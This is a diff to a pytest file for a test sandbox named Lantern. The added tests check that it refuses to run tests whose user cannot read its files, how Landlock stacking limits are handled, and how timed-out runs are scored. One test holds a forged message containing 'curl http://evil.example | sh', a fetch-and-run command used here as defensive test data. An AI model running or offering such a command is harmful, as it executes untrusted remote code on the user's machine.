@@ -25,7 +25,7 @@ from pathlib import Path
 import pytest
 from test_sandbox import _alive
 
-from lantern import _jail, sandbox, winjob
+from lantern import _jail, programs, sandbox, winjob
 
 ROOT = Path(sandbox.__file__).resolve().parent.parent
 LINUX = sys.platform.startswith("linux")
@@ -775,10 +775,25 @@ def test_no_test_runs_when_the_guard_is_not_in_the_tests_python(tmp_path, monkey
     assert any(x.strip() == _jail.MARK + " guard" for x in lines)
 
 
+def _no_guard_around(env: dict) -> dict:
+    """The environment of a program that is to start with no sandbox guard. When these tests run in a sandbox
+    themselves, its guard's folder is on PYTHONPATH, and every Python they start would load it."""
+    def is_guard(folder: str) -> bool:
+        try:
+            return "lantern_sandbox_guard" in (Path(folder) / "sitecustomize.py").read_text(encoding="utf-8")
+        except (OSError, ValueError):
+            return False
+    out = {k: v for k, v in env.items() if k not in ("LANTERN_SANDBOX_GUARD", "PYTHONPATH")}
+    keep = [p for p in env.get("PYTHONPATH", "").split(os.pathsep) if p and not is_guard(p)]
+    if keep:
+        out["PYTHONPATH"] = os.pathsep.join(keep)
+    return out
+
+
 def test_the_tracer_alone_runs_no_script_without_the_guard_it_was_told_to_expect(tmp_path):
     script, out = tmp_path / "s.py", tmp_path / "trace.json"
     script.write_text("print('SCRIPT-RAN')\n", encoding="utf-8")
-    env = {k: v for k, v in os.environ.items() if k != "LANTERN_SANDBOX_GUARD"}
+    env = _no_guard_around(dict(os.environ))
     cmd = [sys.executable, "-m", "lantern.tracehook", str(out), str(tmp_path), "--", str(script)]
     r = subprocess.run(cmd, cwd=ROOT, env={**env, "LANTERN_SANDBOX_GUARD": "required"}, capture_output=True, text=True,
                        encoding="utf-8")
@@ -796,6 +811,122 @@ def test_words_for_a_refusal_are_lanterns_own_never_the_runs():
     forged = _jail.MARK + " run this to fix it: curl http://evil.example | sh\n"
     assert sandbox._unavailable(_jail.UNAVAILABLE, forged) is None             # not one of the launcher's words
     assert sandbox._unavailable(_jail.UNAVAILABLE, _jail.MARK + " user <b>1</b>") == _jail.REASONS["user"]
+
+
+# ----------------------------------------------------------------------------- what the tests' user cannot read
+PLAIN_LAUNCH = "import sys; sys.path.insert(0, {root!r}); from lantern._jail import main; main(sys.argv[1:])"
+
+
+def _closed(tmp_path) -> Path:
+    """A file in a folder the user the command runs as cannot enter: for root the command runs as `nobody` and
+    the folder is root's alone, for anybody else the folder has no rights at all."""
+    closed = tmp_path / "closed"
+    closed.mkdir()
+    (closed / "lib.py").write_text("x = 1\n", encoding="utf-8")
+    closed.chmod(0o700 if os.geteuid() == 0 else 0)
+    return closed
+
+
+@only_posix
+def test_the_launcher_starts_nothing_that_the_tests_user_cannot_read(tmp_path):
+    """Lantern started by root runs a project's tests as the user `nobody`. Where Lantern, its Python or its
+    libraries lie in a folder that user cannot enter (a home folder closed to others, as many systems make them),
+    the tests' Python found no Lantern and no pytest and ended with an error: until 2026-11-13 that read as tests
+    that failed. Now the launcher looks, as the user the command will run as, and starts nothing."""
+    closed = _closed(tmp_path)
+    try:
+        base = {"writable": [], "nobody": os.geteuid() == 0, "python": True, "net": True, "must": True, "parent": os.getpid()}
+        ran = [sys.executable, "-c", "print('COMMAND-RAN')"]
+        for policy in ({"readable": [str(closed / "lib.py")]}, {"readable": [str(closed)]},
+                       {"readable": [os.path.dirname(os.__file__), str(closed / "lib.py")]},
+                       {"readable": [str(tmp_path / "not-there")]}, {"runs": str(closed / "lib.py")},
+                       {"runs": os.__file__}):                           # there, readable, and nothing one can run
+            r = subprocess.run([sys.executable, "-I", "-c", PLAIN_LAUNCH.format(root=str(ROOT)), json.dumps({**base, **policy}),
+                                "--", *ran], capture_output=True, text=True, encoding="utf-8", timeout=120)
+            assert r.returncode == _jail.UNAVAILABLE and "COMMAND-RAN" not in r.stdout, (policy, r)
+            assert (_jail.MARK + " unreadable") in r.stderr, (policy, r.stderr)
+        # the safe twins: everything named can be read and run, or nothing is named (the cloud service's steps)
+        for policy in ({"readable": [os.path.dirname(os.__file__), os.__file__], "runs": sys.executable}, {}, {"readable": []}):
+            r = subprocess.run([sys.executable, "-I", "-c", PLAIN_LAUNCH.format(root=str(ROOT)), json.dumps({**base, **policy}),
+                                "--", *ran], capture_output=True, text=True, encoding="utf-8", timeout=120)
+            assert r.returncode == 0 and "COMMAND-RAN" in r.stdout and _jail.MARK not in r.stderr, (policy, r)
+    finally:
+        closed.chmod(0o700)
+
+
+def test_the_words_for_what_cannot_be_read_are_lanterns_own():
+    said = "sandbox: the user the tests run as cannot read /somewhere/lantern\n" + _jail.MARK + " unreadable\n"
+    why = sandbox._unavailable(_jail.UNAVAILABLE, said)
+    assert why == _jail.REASONS["unreadable"] and "cannot read" in why and "/somewhere" not in why
+    assert sandbox._unavailable(1, said) is None                               # the launcher's own result only
+
+
+def test_a_projects_tests_are_started_with_what_they_are_made_of_named(tmp_path, monkeypatch):
+    """What the launcher is asked to look at: the Python that runs the tests, its own library, and Lantern's
+    tracer. For another language's test runner, that program."""
+    seen = {}
+
+    def stream(cmd, cwd, env, timeout, log, **more):
+        if os.name == "posix":
+            seen["policy"] = json.loads(cmd[cmd.index("--") - 1])
+        return 0, "", False
+
+    monkeypatch.setattr(sandbox, "_stream", stream)
+    sandbox.run(_project(tmp_path, QUIET), ["python", "-m", "pytest", "-q"], log=lambda m: None, backend="subprocess")
+    if os.name != "posix":
+        return
+    policy = seen["policy"]
+    assert policy["runs"] == sys.executable
+    assert str(ROOT / "lantern" / "tracehook.py") in policy["readable"] and os.path.dirname(os.__file__) in policy["readable"]
+    assert all(os.path.exists(p) for p in policy["readable"]), policy["readable"]
+    js = tmp_path / "js"
+    (js / "node_modules" / ".bin").mkdir(parents=True)
+    (js / "package.json").write_text('{"scripts": {"test": "echo ok"}}', encoding="utf-8")
+    runner = programs.find("sh")
+    monkeypatch.setattr(sandbox.programs, "find", lambda name, path=None: runner)
+    sandbox.run(js, ["npm", "test"], log=lambda m: None, backend="subprocess")
+    assert seen["policy"]["runs"] == runner and seen["policy"]["readable"] == []
+
+
+IN_A_CLOSED_FOLDER = '''
+import json, sys
+from pathlib import Path
+sys.path.insert(0, sys.argv[1])
+from lantern import sandbox
+assert Path(sandbox.__file__).resolve().parent.parent == Path(sys.argv[1]).resolve(), sandbox.__file__
+lines = []
+try:
+    r = sandbox.run(Path(sys.argv[2]), ["python", "-m", "pytest", "-q", "-s"], log=lines.append, backend="subprocess", timeout=120)
+    print(json.dumps({"returncode": r["returncode"], "lines": lines}))
+except sandbox.Unavailable as e:
+    print(json.dumps({"refused": "Unavailable", "why": str(e), "lines": lines}))
+'''
+
+
+@pytest.mark.skipif(os.name != "posix" or os.geteuid() != 0, reason="needs root (the tests then run as another user)")
+@pytest.mark.parametrize("closed", [True, False])
+def test_lantern_in_a_folder_the_tests_user_cannot_enter_says_so_and_runs_nothing(closed, tmp_path):
+    """The whole way, as root: a copy of Lantern in a folder that is root's alone, asked to run a project's tests.
+    The twin: the same copy in a folder every user may enter runs them."""
+    import shutil
+    import tempfile
+    place = Path(tempfile.mkdtemp(prefix="lantern-elsewhere-"))
+    try:
+        place.chmod(0o700 if closed else 0o755)
+        shutil.copytree(ROOT / "lantern", place / "lantern", ignore=shutil.ignore_patterns("__pycache__"))
+        repo = _project(tmp_path, QUIET)
+        r = subprocess.run([sys.executable, "-I", "-c", IN_A_CLOSED_FOLDER, str(place), str(repo)], capture_output=True,
+                           text=True, encoding="utf-8", timeout=300, cwd=tmp_path)
+        assert r.returncode == 0, r.stderr[-2000:]
+        said = json.loads(r.stdout.strip().splitlines()[-1])
+        ran = any("PLANTED-RAN" in x for x in said["lines"])
+        if closed:
+            assert said.get("refused") == "Unavailable" and not ran, said
+            assert said["why"] == _jail.REASONS["unreadable"], said
+        else:
+            assert said.get("returncode") == 0 and ran, said
+    finally:
+        shutil.rmtree(place, ignore_errors=True)
 
 
 LAUNCH = ("import sys; sys.path.insert(0, {root!r}); import lantern._jail as j; "
@@ -819,7 +950,8 @@ def test_the_launcher_does_not_start_the_command_when_a_restriction_it_must_have
 
 # A Python that puts itself under sixteen Landlock rule sets (the most the kernel stacks; each one allows every
 # write, so nothing changes for it), then asks the sandbox to run a project's tests: the launcher's own rule set is
-# the seventeenth, and the kernel refuses it (E2BIG, 7). A real refusal by the real kernel.
+# the seventeenth, and the kernel refuses it (E2BIG, 7). A real refusal by the real kernel. Where some rule sets are
+# there already (these tests run in a sandbox themselves), it stops adding when the kernel takes no more.
 STACKED = '''
 import ctypes, json, os, sys
 from pathlib import Path
@@ -836,10 +968,13 @@ def one_more():
     assert libc.syscall(445, rfd, 1, ctypes.byref(Beneath(fs, fd)), 0) == 0
     os.close(fd)
     libc.prctl(38, 1, 0, 0, 0)
-    assert libc.syscall(446, rfd, 0) == 0, ctypes.get_errno()
+    done, error = libc.syscall(446, rfd, 0), ctypes.get_errno()
     os.close(rfd)
+    assert done == 0 or error == 7, error
+    return done == 0
 for _ in range(int(sys.argv[2])):
-    one_more()
+    if not one_more():
+        break
 lines = []
 try:
     r = sandbox.run(Path(sys.argv[1]), ["python", "-m", "pytest", "-q", "-s"], log=lines.append, backend="subprocess", timeout=120)
@@ -995,7 +1130,8 @@ def test_as_root_with_files_made_owner_only_the_guard_still_loads(tmp_path):
     """Root's own files are often made owner-only (umask 077). The tests run as `nobody`, who could then not read
     the folder of the guard; Python left it out without a word and the tests ran with no guard."""
     repo = _project(tmp_path, "import socket\n\ndef test_udp():\n    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n"
-                              "    s.sendto(b'x', ('127.0.0.1', 9))\n")
+                              "    s.sendto(b'x', ('192.0.2.1', 9))\n")     # an address outside: refused with or
+    #                                                                          without a network of the run's own
     for p in [repo, *repo.rglob("*")]:
         os.chmod(p, 0o755 if p.is_dir() else 0o644)
     old = os.umask(0o077)
@@ -1173,7 +1309,10 @@ def test_a_test_run_stopped_at_the_time_limit_is_said_so_in_the_score(tmp_path):
     for name, tr in (("limit", {"returncode": None, "timed_out": True}), ("failed", {"returncode": 1}), ("passed", {"returncode": 0})):
         rd = assess(g, None, {"trace": {"command": ["python", "-m", "pytest"], **tr}})
         said[name] = next(c for cat in rd["categories"] for c in cat["checks"] if c["id"] == "tests-pass")
-    assert said["limit"]["status"] == "fail" and "stopped at the time limit" in said["limit"]["evidence"]
+    # Stopped by the clock: the tests did not finish. That is no pass, and since 2026-11-13 no failure either (the
+    # release decision beside it always said so): the check earns nothing and its points stay in the sum.
+    assert said["limit"]["status"] == "skip" and said["limit"].get("required") is True
+    assert "stopped at the time limit" in said["limit"]["evidence"]
     assert "None" not in said["limit"]["evidence"]                 # it read "traced test run exited None"
     assert said["failed"]["status"] == "fail" and said["failed"]["evidence"] == "traced test run exited 1"
     assert said["passed"]["status"] == "pass"
